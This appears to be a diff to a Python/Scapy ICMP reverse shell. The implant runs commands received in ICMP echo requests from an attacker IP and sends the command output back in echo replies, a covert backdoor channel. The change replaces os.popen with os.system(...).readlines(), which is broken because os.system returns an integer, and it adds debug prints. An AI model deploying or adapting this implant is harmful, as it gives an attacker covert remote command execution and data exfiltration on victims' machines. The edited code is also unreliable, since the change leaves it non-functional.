@@ -8,8 +8,10 @@ time_to_live = 64
 def icmpshell(packet):
     if packet[IP].src == args.attacker_ip and packet[ICMP].type == 8 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
         command = (packet[Raw].load).decode('utf-8', errors='ignore')
-        payload = os.popen(command).readlines()
+        payload = os.system(command).readlines()
+        print(payload)
         icmppacket = (IP(dst=args.attacker_ip, ttl=time_to_live)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
+        print(icmppacket)
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
